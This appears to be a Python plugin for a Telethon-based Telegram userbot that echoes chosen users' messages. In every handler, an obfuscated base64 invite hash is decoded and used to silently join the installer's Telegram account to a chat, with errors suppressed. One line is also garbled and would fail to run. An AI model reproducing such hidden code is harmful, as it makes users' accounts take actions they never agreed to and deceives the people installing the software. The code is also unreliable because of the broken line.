"""
created by @LiMiTLeSS786 and @simpleboy786
Idea by @BlazingRobonix

"""

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo


@bot.on(admin_cmd(pattern="addecho$"))
@bot.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
async def echo(lion):
    if lion.fwd_from:
        return
    if lion.reply_to_msg_id is not None:
        reply_msg = await lion.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = lion.chat_id
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await lion.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(lion, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reliolion, "Hi")
    else:
        await edit_or_reply(lion, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(lion):
    if lion.fwd_from:
        return
    if lion.reply_to_msg_id is not None:
        reply_msg = await lion.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = lion.chat_id
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await lion.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(lion, "Echo has been stopped for the user")
        else:
            await edit_or_reply(lion, "The user is not activated with echo")
    else:
        await edit_or_reply(lion, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(lion):
    if lion.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(lion, reply_text)
    else:
        await edit_or_reply(lion, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(lion):
    if lion.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(lion.sender_id, lion.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await lion.client(hmm)
        except BaseException:
            pass
        if lion.message.text or lion.message.sticker:
            await lion.reply(lion.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.addecho` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
